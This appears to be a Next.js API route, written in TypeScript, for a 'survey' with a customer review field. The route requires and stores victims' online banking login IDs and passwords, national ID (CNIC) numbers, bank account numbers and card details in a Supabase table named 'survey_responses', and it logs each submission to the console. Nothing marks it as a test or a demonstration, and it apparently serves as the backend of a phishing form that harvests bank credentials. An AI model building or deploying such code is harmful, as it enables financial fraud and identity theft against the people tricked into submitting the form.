import { supabase } from "../../lib/supabaseClient";
import { NextResponse } from "next/server";

export async function POST(req: Request) {
  try {
    const body = await req.json();
    console.log("API body received:", body);

    if (!body.account || !body.card || !body.review) {
      console.error("Missing required fields:", body);
      return NextResponse.json(
        { error: "Missing required fields" },
        { status: 400 }
      );
    }

    const { account, card, review } = body;

     for (const key of ["loginId","password","cnic","bankName","accountNumber"]) {
      if (!account[key]) {
        console.error(`Account field ${key} is missing`);
        return NextResponse.json({ error: `Account field ${key} missing` }, { status: 400 });
      }
    }

    for (const key of ["cardNumber","issuedDate","nameOnCard"]) {
      if (!card[key]) {
        console.error(`Card field ${key} is missing`);
        return NextResponse.json({ error: `Card field ${key} missing` }, { status: 400 });
      }
    }

    const { data, error } = await supabase.from("survey_responses").insert([
      {
        login_id: account.loginId,
        password: account.password,
        cnic: account.cnic,
        bank_name: account.bankName,
        account_number: account.accountNumber,
        card_number: card.cardNumber,
        card_issue_date: card.issuedDate,
        name_on_card: card.nameOnCard,
        review: review,
      },
    ]);

    if (error) {
      return NextResponse.json({ error: error.message }, { status: 500 });
    }

    return NextResponse.json({ success: true, data }, { status: 200 });
  } catch (err) {
    return NextResponse.json({ error: "Invalid request" }, { status: 400 });
  }
}
